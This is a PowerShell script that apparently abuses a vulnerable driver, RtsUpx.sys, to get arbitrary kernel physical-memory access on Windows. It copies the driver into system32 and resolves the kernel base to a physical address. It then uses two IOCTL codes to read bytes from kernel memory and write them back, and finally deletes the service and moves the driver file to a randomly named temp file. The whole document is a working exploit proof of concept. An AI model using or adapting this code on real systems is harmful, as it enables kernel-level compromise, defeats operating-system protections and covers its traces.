Clear-Host
Write-Host

try {
    Copy-Item `
        -Path (Join-Path $PSScriptRoot "RtsUpx.sys") `
        -Destination "$env:windir\system32\RtsUpx.sys" `
        -ErrorAction SilentlyContinue | Out-Null
} catch {}

$Buffer      = $null
$SizeToRead  = 12

$VA       = Get-KernelBaseAddress
$PA       = Resolve-DirectoryTable -VA64 $VA -ProcessID 4
$hDevice  = Get-FileHandle -FileName RtsUpx

try {

  # ~~~~~~~~~ @
  # Read Case @
  # ~~~~~~~~~ @

  try {
    $SizeCeiling = [Math]::Max(24, $SizeToRead)
    $InOutPtr    = New-IntPtr -Size $SizeCeiling -TypeSize ([Int64], [Int64], [Int32], [Int32]) -Values (0L, $PA, $SizeToRead, 0)
    $InvokeCall  = Invoke-IoctlCall -Mode 1 -FileHandle $hDevice -IoCtrlCode 0x22005C -InOutPtr $InOutPtr -InputSize 24 -OutputSize $SizeToRead
    
    [String]::Format("DeviceIO Read Call --> {0} (Bytes Returned: {1})", $InvokeCall.Success, $InvokeCall.BytesRet)   
    if ($InvokeCall.Success) {
        $Buffer = [Byte[]]::new($SizeToRead)
        [marshal]::Copy($InOutPtr, $Buffer, 0, $SizeToRead)
        
        Write-Host
        $Buffer | Format-HexView -Mode 8x
    }
  } finally {
      Free-IntPtr $InOutPtr -Method Auto
  }

  # ~~~~~~~~~~ @
  # Write Case @
  # ~~~~~~~~~~ @

  if ($Buffer) {
      try {
        Write-Host
        $SizeCeiling = 0x14 + $Buffer.Length
        $InOutPtr    = New-IntPtr -Size $SizeCeiling -TypeSize ([Int64], [Int64], [Int32], [Int32]) -Values (0L, $PA, $Buffer.Length, 0)
        [marshal]::Copy($Buffer, 0, ([IntPtr]::Add($InOutPtr, 0x14)), $Buffer.Length)
        $InvokeCall  = Invoke-IoctlCall -Mode 1 -FileHandle $hDevice -IoCtrlCode 0x220058 -InOutPtr $InOutPtr -InputSize 32 -OutputSize 0
        [String]::Format("DeviceIO Write Call --> {0} (Bytes Returned: {1})", $InvokeCall.Success, $InvokeCall.BytesRet)
      } finally {
          Free-IntPtr $InOutPtr -Method Auto
      }
  }

} finally {
  if ($hDevice) {
      Free-IntPtr $hDevice -Method NtHandle
  }
}

$TempDir   = $env:TEMP
$SourceDir = "$env:windir\System32"

$Binary = @("RtsUpx")
$Binary | % {
    $DriverPath = Join-Path -Path $SourceDir -ChildPath "$_.sys"
    $DestPath   = Join-Path -Path $TempDir   -ChildPath ([guid]::NewGuid().ToString())
    Stop-Service -Name $_ -ea 0
    sc.exe delete $_ | Out-Null
    if (Test-Path $DriverPath) {
	    Move-Item -Path $DriverPath -Destination $DestPath -Force -ea 0
    }
}